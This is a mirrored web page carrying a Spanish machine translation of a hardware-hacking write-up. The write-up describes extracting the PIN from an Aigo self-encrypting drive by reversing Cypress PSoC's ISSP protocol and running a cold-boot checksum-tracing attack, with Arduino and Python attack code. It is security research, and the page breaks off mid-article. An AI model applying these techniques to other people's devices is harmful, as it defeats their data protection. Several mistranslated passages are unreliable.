<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üë∏üèº üòÅ üë∞üèø Invertir y piratear el HDD externo de autocifrado de Aigo. Parte 2: Dumping con Cypress PSoC ü§ûüèª üíà üèéÔ∏è</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Esta es la segunda y √∫ltima parte del art√≠culo sobre la pirater√≠a de unidades de autocifrado externas. Les recuerdo que un colega me trajo recientemen...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Invertir y piratear el HDD externo de autocifrado de Aigo. Parte 2: Dumping con Cypress PSoC</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/455529/"><p>  Esta es la segunda y √∫ltima parte del art√≠culo sobre la pirater√≠a de unidades de autocifrado externas.  Les recuerdo que un colega me trajo recientemente un disco duro Patriot (Aigo) SK8671, y decid√≠ revertirlo, y ahora estoy compartiendo lo que sali√≥ de √©l.  Antes de seguir leyendo, aseg√∫rese de leer la <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">primera parte del</a> art√≠culo. </p><br><p> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">4. Comenzamos a eliminar el volcado de la unidad flash interna PSoC</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">5. Protocolo ISSP</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">- 5.1.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">¬øQu√© es un ISSP?</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">- 5.2.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Desmitificaci√≥n de vectores</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">- 5.3.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Chatea con PSoC</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">- 5.4.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Identificaci√≥n de registros intra-chip.</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">- 5.5.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Brocas protectoras</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">6. Primer ataque (fallido): ROMX</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">7. Segundo ataque: seguimiento con reinicio en fr√≠o</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">- 7.1.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Implementaci√≥n</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">- 7.2.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Lee el resultado</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">- 7.3.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Reconstrucci√≥n del binario flash.</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">- 7.4.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Encuentra la direcci√≥n de almacenamiento de c√≥digo PIN</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">- 7.5.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Eliminamos el basurero del bloque No. 126</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">- 7.6.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Recuperaci√≥n de c√≥digo PIN</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">8. ¬øQu√© sigue?</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">9. Conclusi√≥n</a> </p><br><p><img src="https://habrastorage.org/webt/wx/nm/gk/wxnmgkeurrmiurx87rujoynxrsq.jpeg"></p><a name="habracut"></a><br><a name="a4"></a><br><h1 id="4-nachinaem-snimat-damp-s-vnutrenney-fleshki-psoc">  4. Comenzamos a eliminar el volcado de la unidad flash interna PSoC </h1><br><p>  Entonces, todo indica (como establecimos en [la primera parte] ()) que el c√≥digo PIN est√° almacenado en los intestinos flash de PSoC.  Por lo tanto, necesitamos leer estos intestinos r√°pidos.  Frente de trabajo necesario: </p><br><ul><li>  tomar el control de la "comunicaci√≥n" con el microcontrolador; </li><li>  encuentre una manera de verificar si esta "comunicaci√≥n" est√° protegida contra la lectura desde el exterior; </li><li>  encuentra una forma de evitar la seguridad. </li></ul><br><p>  Hay dos lugares donde tiene sentido buscar un c√≥digo PIN v√°lido: </p><br><ul><li>  memoria flash interna; </li><li>  SRAM, donde se puede almacenar el c√≥digo PIN para compararlo con el c√≥digo PIN que ingresa el usuario. </li></ul><br><p>  Mirando hacia el futuro, noto que a√∫n logr√© eliminar el volcado de la unidad flash interna PSoC, evitando su sistema de protecci√≥n, utilizando el "seguimiento de restablecimiento en fr√≠o" del ataque de hardware despu√©s de revertir las caracter√≠sticas no documentadas del protocolo ISSP.  Esto me permiti√≥ volcar directamente el c√≥digo PIN actual. </p><br><pre><code class="plaintext hljs">$ ./psoc.py syncing: KO OK [...] PIN: 1 2 3 4 5 6 7 8 9</code> </pre> <br><p>  El c√≥digo del programa resultante: </p><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">C√≥digo Arduino para HSSP</a> ; </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Controlador Python y desensamblador ISSP</a> . </li></ul><br><a name="a5"></a><br><h1 id="5-issp-protokol">  5. Protocolo ISSP </h1><br><a name="a51"></a><br><h2 id="51-chto-takoe-issp">  5.1.  ¬øQu√© es un ISSP? </h2><br><p>  La "comunicaci√≥n" con el microcontrolador puede significar diferentes cosas: de "vendedor a vendedor", a la interacci√≥n mediante un protocolo en serie (por ejemplo, ICSP para PIC de Microchip). </p><br><p>  Cypress tiene su propio protocolo patentado para esto, llamado ISSP (protocolo de programaci√≥n en serie del sistema), que se describe parcialmente en la <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">especificaci√≥n t√©cnica</a> .  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">El documento US7185162</a> tambi√©n proporciona informaci√≥n.  Tambi√©n hay un an√°logo de OpenSource llamado HSSP (lo usaremos un poco m√°s adelante).  ISSP funciona de la siguiente manera: </p><br><ul><li>  reiniciar PSoC; </li><li>  traiga el n√∫mero m√°gico al segmento de datos en serie de este PSoC;  para ingresar al modo de programaci√≥n externa; </li><li>  enviar comandos que son cadenas de bits largas llamadas "vectores". </li></ul><br><p>  En la documentaci√≥n del ISSP, estos vectores se definen solo para un peque√±o pu√±ado de comandos: </p><br><ul><li>  Initialialize-1 </li><li>  Initialize-2 </li><li>  Initialize-3 (opciones de 3V y 5V) </li><li>  CONFIGURACI√ìN DE IDENTIFICACI√ìN </li><li>  LEER-ID-PALABRA </li><li>  SET-BLOCK-NUM: 10011111010dddddddd111, donde dddddddd = block # </li><li>  BORRAR A GRANEL </li><li>  PROGRAMA-BLOQUE </li><li>  VERIFICAR-CONFIGURACI√ìN </li><li>  READ-BYTE: 10110aaaaaaZDDDDDDDDDZ1, donde DDDDDDDDD = salida de datos, aaaaaa = direcci√≥n (6 bits) </li><li>  WRITE-BYTE: 10010aaaaaadddddddd111, donde dddddddd = datos, aaaaaa = direcci√≥n (6 bits) </li><li>  Seguro </li><li>  CONFIGURACI√ìN DE CHECKSUM </li><li>  READ-CHECKSUM: 10111111001ZDDDDDDDDDZ110111111000ZDDDDDDDDZ1, donde DDDDDDDDDDDDDDDD = salida de datos: suma de comprobaci√≥n del dispositivo </li><li>  BORRAR BLOQUEO </li></ul><br><p>  Por ejemplo, el vector para Initialize-2: </p><br><pre> <code class="plaintext hljs">1101111011100000000111 1101111011000000000111 1001111100000111010111 1001111100100000011111 1101111010100000000111 1101111010000000011111 1001111101110000000111 1101111100100110000111 1101111101001000000111 1001111101000000001111 1101111000000000110111 1101111100000000000111 1101111111100010010111</code> </pre> <br><p>  Todos los vectores tienen la misma longitud: 22 bits.  La documentaci√≥n del HSSP tiene informaci√≥n adicional sobre los ISSP: "Un vector ISSP no es m√°s que una secuencia de bits que representa un conjunto de instrucciones". </p><br><a name="a52"></a><br><h2 id="52-demistifikaciya-vektorov">  5.2.  Desmitificaci√≥n de vectores </h2><br><p>  Veamos qu√© pasa aqu√≠.  Inicialmente, asum√≠ que estos mismos vectores son variantes en bruto de las instrucciones M8C, sin embargo, despu√©s de probar esta hip√≥tesis, descubr√≠ que los c√≥digos de operaci√≥n no coinciden. </p><br><p>  Luego busqu√© en Google el vector anterior y me top√© con <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">este</a> estudio, donde el autor, aunque no entra en detalles, da algunas pistas pr√°cticas: "Cada instrucci√≥n comienza con tres bits que corresponden a una de las cuatro mnemotecnias (leer de RAM, escribir en RAM , lea el registro, escriba el registro).  Luego viene la direcci√≥n de 8 bits, seguida de 8 bits de datos (ya sea le√≠dos o escritos) y finalmente tres bits de parada ". </p><br><p>  Luego pude reunir informaci√≥n muy √∫til de la secci√≥n ROM de supervisi√≥n (SROM) del <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">manual t√©cnico</a> .  SROM es una ROM codificada en PSoC que proporciona funciones de servicio (similares a Syscall) para el c√≥digo de software que se ejecuta en el espacio del usuario: </p><br><ul><li>  00h: SWBootReset </li><li>  01h: ReadBlock </li><li>  02h: WriteBlock </li><li>  03h: EraseBlock </li><li>  06h: TableRead </li><li>  07h: CheckSum </li><li>  08h: Calibrar0 </li><li>  09h: Calibrar1 </li></ul><br><p>  Comparando nombres de vectores con funciones SROM, podemos mapear las diversas operaciones soportadas por este protocolo a los par√°metros esperados de SROM.  Gracias a esto, podemos decodificar los primeros tres bits de vectores ISSP: </p><br><ul><li>  100 =&gt; "wrmem" </li><li>  101 =&gt; "rdmem" </li><li>  110 =&gt; "wrreg" </li><li>  111 =&gt; "rdreg" </li></ul><br><p>  Sin embargo, solo se puede obtener una comprensi√≥n completa de los procesos dentro del chip a trav√©s de la comunicaci√≥n directa con PSoC. </p><br><a name="a53"></a><br><h2 id="53-obschenie-s-psoc">  5.3.  Chatea con PSoC </h2><br><p>  Como Dirk Petrautsky ya ha <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">portado el</a> c√≥digo HSSP de Cypress a Arduino, utilic√© Arduino Uno para conectar la placa del teclado al conector ISSP. </p><br><p>  Tenga en cuenta que durante mi investigaci√≥n, cambi√© bastante el c√≥digo Dirk.  Puede encontrar mi modificaci√≥n en GitHub: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">aqu√≠ est√° el</a> script Python correspondiente para comunicarse con Arduino, en mi repositorio <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">cypress_psoc_tools</a> . </p><br><p>  Entonces, usando Arduino, al principio solo us√© vectores "oficiales" para la "comunicaci√≥n".  Trat√© de leer la ROM interna usando el comando VERIFY.  Como era de esperar, no pude hacer esto.  Probablemente debido al hecho de que los bits de protecci√≥n de lectura se activan dentro de la unidad flash. </p><br><p>  Luego cre√© algunos de mis vectores simples para escribir y leer memorias / registros.  Tenga en cuenta que podemos leer todo el SROM, ¬°aunque la unidad flash est√© protegida! </p><br><a name="a54"></a><br><h2 id="54-identifikaciya-vnutrichipovyh-registrov">  5.4.  Identificaci√≥n de registros intra-chip. </h2><br><p>  Al observar los vectores "desensamblados", descubr√≠ que el dispositivo utiliza registros no documentados (0xF8-0xFA) para indicar c√≥digos de operaci√≥n M8C que se ejecutan directamente, sin pasar por la protecci√≥n.  Esto me permiti√≥ ejecutar varios c√≥digos de operaci√≥n como "ADD", "MOV A, X", "PUSH" o "JMP".  Gracias a ellos (observando los efectos secundarios que tienen en los registros), pude determinar cu√°les de los registros indocumentados son en realidad registros regulares (A, X, SP y PC). </p><br><p>  Como resultado, el c√≥digo "desensamblado" generado por la herramienta HSSP_disas.rb se ve as√≠ (para mayor claridad, agregu√© comentarios): </p><br><pre> <code class="plaintext hljs">--== init2 ==-- [DE E0 1C] wrreg CPU_F (f7), 0x00 #   [DE C0 1C] wrreg SP (f6), 0x00 #  SP [9F 07 5C] wrmem KEY1, 0x3A #    SSC [9F 20 7C] wrmem KEY2, 0x03 #  [DE A0 1C] wrreg PCh (f5), 0x00 #  PC (MSB) ... [DE 80 7C] wrreg PCl (f4), 0x03 # (LSB) ...  3 ?? [9F 70 1C] wrmem POINTER, 0x80 # RAM-    [DF 26 1C] wrreg opc1 (f9), 0x30 #  1 =&gt; "HALT" [DF 48 1C] wrreg opc2 (fa), 0x40 #  2 =&gt; "NOP" [9F 40 3C] wrmem BLOCKID, 0x01 # BLOCK ID   SSC [DE 00 DC] wrreg A (f0), 0x06 #  "Syscall" : TableRead [DF 00 1C] wrreg opc0 (f8), 0x00 #   SSC, "Supervisory SROM Call" [DF E2 5C] wrreg CPU_SCR0 (ff), 0x12 #  :   </code> </pre> <br><a name="a55"></a><br><h2 id="55-zaschitnye-bity">  5.5.  Brocas protectoras </h2><br><p>  En esta etapa, ya puedo comunicarme con PSoC, pero todav√≠a no tengo informaci√≥n confiable sobre los bits de protecci√≥n de la unidad flash.  Me sorprendi√≥ mucho el hecho de que Cypress no le da al usuario del dispositivo ning√∫n medio para verificar si la protecci√≥n est√° activada.  Entr√© profundamente en Google para finalmente entender que el c√≥digo HSSP proporcionado por Cypress se actualiz√≥ despu√©s de que Dirk lanz√≥ su modificaci√≥n.  Y ah√≠ tienes!  Aqu√≠ hay un nuevo vector como este: </p><br><pre> <code class="plaintext hljs">[DE E0 1C] wrreg CPU_F (f7), 0x00 [DE C0 1C] wrreg SP (f6), 0x00 [9F 07 5C] wrmem KEY1, 0x3A [9F 20 7C] wrmem KEY2, 0x03 [9F A0 1C] wrmem 0xFD, 0x00 #   [9F E0 1C] wrmem 0xFF, 0x00 #  [DE A0 1C] wrreg PCh (f5), 0x00 [DE 80 7C] wrreg PCl (f4), 0x03 [9F 70 1C] wrmem POINTER, 0x80 [DF 26 1C] wrreg opc1 (f9), 0x30 [DF 48 1C] wrreg opc2 (fa), 0x40 [DE 02 1C] wrreg A (f0), 0x10 #  syscall ! [DF 00 1C] wrreg opc0 (f8), 0x00 [DF E2 5C] wrreg CPU_SCR0 (ff), 0x12</code> </pre> <br><p>  Usando este vector (ver read_security_data en psoc.py), obtenemos todos los bits de protecci√≥n en SRAM a 0x80, donde cada bit est√° protegido con dos bits. </p><br><p>  El resultado es deprimente: todo est√° protegido en el modo "desactivar lectura y escritura externa".  Por lo tanto, no solo podemos leer cualquier cosa de la unidad flash USB, sino tambi√©n escribirla (por ejemplo, para introducir un volcador de ROM all√≠).  Y la √∫nica forma de desactivar la protecci√≥n es borrar completamente el chip completo.  :-( </p><br><a name="a6"></a><br><h1 id="6-pervaya-neudavshayasya-ataka-romx">  6. Primer ataque (fallido): ROMX </h1><br><p>  Sin embargo, podemos probar el siguiente truco: dado que tenemos la capacidad de ejecutar c√≥digos de operaci√≥n arbitrarios, ¬øpor qu√© no ejecutar ROMX, que se usa para leer la memoria flash?  Este enfoque tiene buenas posibilidades de √©xito.  Debido a que la funci√≥n ReadBlock, que lee datos de SROM (que usan los vectores), verifica si se llama desde ISSP.  Sin embargo, el c√≥digo de operaci√≥n ROMX, presumiblemente, puede no tener tal verificaci√≥n.  Entonces, aqu√≠ est√° el c√≥digo Python (despu√©s de agregar algunas clases auxiliares al c√≥digo Arduino C): </p><br><pre> <code class="plaintext hljs">for i in range(0, 8192): write_reg(0xF0, i&gt;&gt;8) # A = 0 write_reg(0xF3, i&amp;0xFF) # X = 0 exec_opcodes("\x28\x30\x40") # ROMX, HALT, NOP byte = read_reg(0xF0) # ROMX reads ROM[A|X] into A print "%02x" % ord(byte[0]) # print ROM byte</code> </pre> <br><p>  Lamentablemente, este c√≥digo no funciona.  :-( M√°s bien, funciona, pero en la salida obtenemos nuestros propios c√≥digos de operaci√≥n (0x28 0x30 0x40). No creo que la funcionalidad correspondiente del dispositivo sea un elemento de protecci√≥n contra lectura. Esto es m√°s como un truco de ingenier√≠a: cuando se ejecutan c√≥digos de operaci√≥n externos, el bus ROM se redirige a un b√∫fer temporal. </p><br><a name="a7"></a><br><h1 id="7-vtoraya-ataka-trassirovka-s-holodnoy-perezagruzkoy">  7. Segundo ataque: seguimiento con reinicio en fr√≠o </h1><br><p>  Como el truco de ROMX no funcion√≥, comenc√© a pensar en otra variaci√≥n de este truco, descrita en la publicaci√≥n <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">"Arrojando demasiada luz sobre la protecci√≥n del firmware de un microcontrolador"</a> . </p><br><a name="a71"></a><br><h2 id="71-realizaciya">  7.1.  Implementaci√≥n </h2><br><p>  El siguiente vector para CHECKSUM-SETUP aparece en la documentaci√≥n del ISSP: </p><br><pre> <code class="plaintext hljs">[DE E0 1C] wrreg CPU_F (f7), 0x00 [DE C0 1C] wrreg SP (f6), 0x00 [9F 07 5C] wrmem KEY1, 0x3A [9F 20 7C] wrmem KEY2, 0x03 [DE A0 1C] wrreg PCh (f5), 0x00 [DE 80 7C] wrreg PCl (f4), 0x03 [9F 70 1C] wrmem POINTER, 0x80 [DF 26 1C] wrreg opc1 (f9), 0x30 [DF 48 1C] wrreg opc2 (fa), 0x40 [9F 40 1C] wrmem BLOCKID, 0x00 [DE 00 FC] wrreg A (f0), 0x07 [DF 00 1C] wrreg opc0 (f8), 0x00 [DF E2 5C] wrreg CPU_SCR0 (ff), 0x12</code> </pre> <br><p>  Aqu√≠, en esencia, se llama a la funci√≥n SROM 0x07, como se presenta en la documentaci√≥n (cursiva m√≠a): </p><br><blockquote>  Esta funci√≥n suma de comprobaci√≥n suma de comprobaci√≥n.  Calcula una suma de verificaci√≥n de 16 bits del n√∫mero de bloques establecidos por el usuario en un banco flash, contando desde cero.  El par√°metro BLOCKID se usa para transferir el n√∫mero de bloques que se usar√°n al calcular la suma de verificaci√≥n.  Un valor de "1" calcular√° la suma de verificaci√≥n para el bloque cero solamente;  mientras que <em>"0" llevar√° al hecho de que se calcular√° la suma de verificaci√≥n total de los 256 bloques del banco flash.</em>  <em>Se devuelve una suma de comprobaci√≥n de 16 bits a trav√©s de KEY1 y KEY2.</em>  En el par√°metro KEY1, los 8 bits bajos de la suma de comprobaci√≥n son fijos, y en KEY2, se registran los 8 bits altos.  Para dispositivos con m√∫ltiples bancos de flash, se llama a la funci√≥n de suma de comprobaci√≥n para cada uno individualmente.  El n√∫mero de banco con el que funcionar√° lo establece el registro FLS_PR1 (al establecer un bit correspondiente al banco flash de destino). </blockquote><p>  Tenga en cuenta que esta es la suma de comprobaci√≥n m√°s simple: los bytes simplemente se suman uno por uno;  sin caprichos sofisticados de CRC.  Adem√°s, sabiendo que el conjunto de registros en el n√∫cleo M8C es muy peque√±o, supuse que al calcular la suma de verificaci√≥n, los valores intermedios se fijar√°n en las mismas variables que eventualmente ir√°n a la salida: KEY1 (0xF8) / KEY2 (0xF9). </p><br><p>  Entonces, en teor√≠a, mi ataque se ve as√≠: </p><br><ol><li>  Con√©ctese a trav√©s de ISSP. </li><li>  Comenzamos el c√°lculo de la suma de verificaci√≥n utilizando el vector CHECKSUM-SETUP. </li><li>  Reiniciamos el procesador despu√©s del tiempo especificado T. </li><li>  Lea la RAM para obtener la suma de comprobaci√≥n actual C. </li><li>  Repita los pasos 3 y 4, aumentando cada vez T. </li><li>  Recuperamos los datos de la unidad flash restando la suma de verificaci√≥n C anterior de la actual. </li></ol><br><p>  Sin embargo, surgi√≥ un problema: el vector Initialize-1, que debemos enviar despu√©s del reinicio, sobrescribe KEY1 y KEY2: </p><br><pre> <code class="plaintext hljs">1100101000000000000000 # ,  PSoC    nop nop nop nop nop [DE E0 1C] wrreg CPU_F (f7), 0x00 [DE C0 1C] wrreg SP (f6), 0x00 [9F 07 5C] wrmem KEY1, 0x3A #     [9F 20 7C] wrmem KEY2, 0x03 #   [DE A0 1C] wrreg PCh (f5), 0x00 [DE 80 7C] wrreg PCl (f4), 0x03 [9F 70 1C] wrmem POINTER, 0x80 [DF 26 1C] wrreg opc1 (f9), 0x30 [DF 48 1C] wrreg opc2 (fa), 0x40 [DE 01 3C] wrreg A (f0), 0x09 # SROM- 9 [DF 00 1C] wrreg opc0 (f8), 0x00 # SSC [DF E2 5C] wrreg CPU_SCR0 (ff), 0x12</code> </pre> <br><p>  Este c√≥digo sobrescribe nuestra preciosa suma de comprobaci√≥n llamando a Calibrate1 (funci√≥n SROM 9) ... ¬øTal vez podamos ingresar al modo de programaci√≥n enviando el n√∫mero m√°gico (desde el principio del c√≥digo anterior) y luego leer SRAM?  ¬°Y s√≠, funciona!  El c√≥digo Arduino que implementa este ataque es bastante simple: </p><br><pre> <code class="cpp hljs"><span class="hljs-keyword"><span class="hljs-keyword">case</span></span> Cmnd_STK_START_CSUM: checksum_delay = ((<span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span>)getch())&lt;&lt;<span class="hljs-number"><span class="hljs-number">24</span></span>; checksum_delay |= ((<span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span>)getch())&lt;&lt;<span class="hljs-number"><span class="hljs-number">16</span></span>; checksum_delay |= ((<span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span>)getch())&lt;&lt;<span class="hljs-number"><span class="hljs-number">8</span></span>; checksum_delay |= getch(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(checksum_delay &gt; <span class="hljs-number"><span class="hljs-number">10000</span></span>) { ms_delay = checksum_delay/<span class="hljs-number"><span class="hljs-number">1000</span></span>; checksum_delay = checksum_delay%<span class="hljs-number"><span class="hljs-number">1000</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { ms_delay = <span class="hljs-number"><span class="hljs-number">0</span></span>; } send_checksum_v(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(checksum_delay) delayMicroseconds(checksum_delay); delay(ms_delay); start_pmode();</code> </pre> <br><ol><li>  Lea checkum_delay. </li><li>  Ejecute el c√°lculo de suma de verificaci√≥n (send_checksum_v). </li><li>  Espera un per√≠odo de tiempo determinado;  dados los siguientes escollos: <br><ul><li>  Mat√© mucho tiempo hasta que descubr√≠ que <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">delayMicroseconds</a> funcionaba correctamente solo con demoras que no superaban los 16383mks; </li><li>  y luego nuevamente mat√≥ la misma cantidad de tiempo hasta que descubri√≥ que delayMicroseconds, si pasaba 0 a su entrada, ¬°funcionaba completamente mal! </li></ul></li><li>  Vuelva a cargar PSoC en modo de programaci√≥n (solo env√≠e el n√∫mero m√°gico, sin enviar vectores de inicializaci√≥n). </li></ol><br><p>  El c√≥digo Python resultante: </p><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">for</span></span> delay <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">150000</span></span>): <span class="hljs-comment"><span class="hljs-comment">#    for i in range(0, 10): #      try: reset_psoc(quiet=True) #       send_vectors() #    ser.write("\x85"+struct.pack("&gt;I", delay)) #    +    res = ser.read(1) #  arduino ACK except Exception as e: print e ser.close() os.system("timeout -s KILL 1s picocom -b 115200 /dev/ttyACM0 2&gt;&amp;1 &gt; /dev/null") ser = serial.Serial('/dev/ttyACM0', 115200, timeout=0.5) #    continue print "%05d %02X %02X %02X" % (delay, #  RAM- read_regb(0xf1), read_ramb(0xf8), read_ramb(0xf9))</span></span></code> </pre> <br><p>  En pocas palabras, lo que hace este c√≥digo: </p><br><ol><li>  Vuelve a cargar el PSoC (y le env√≠a un n√∫mero m√°gico). </li><li>  Env√≠a vectores de inicializaci√≥n completos. </li><li>  Llama a la funci√≥n Arduino Cmnd_STK_START_CSUM (0x85), donde el retraso en microsegundos se pasa como par√°metro. </li><li>  Lee la suma de comprobaci√≥n (0xF8 y 0xF9) y el registro no documentado 0xF1. </li></ol><br><p>  Este c√≥digo se ejecuta 10 veces en 1 microsegundo.  Aqu√≠ se incluye 0xF1 porque fue el √∫nico registro que cambi√≥ al calcular la suma de verificaci√≥n.  Quiz√°s este es alg√∫n tipo de variable temporal utilizada por el dispositivo de l√≥gica aritm√©tica.  Preste atenci√≥n al truco feo que reinicio Arduino usando picocom cuando el Arduino deja de dar signos de vida (no tengo idea de por qu√©). </p><br><a name="a72"></a><br><h2 id="72-schityvaem-rezultat">  7.2.  Lee el resultado </h2><br><p>  El 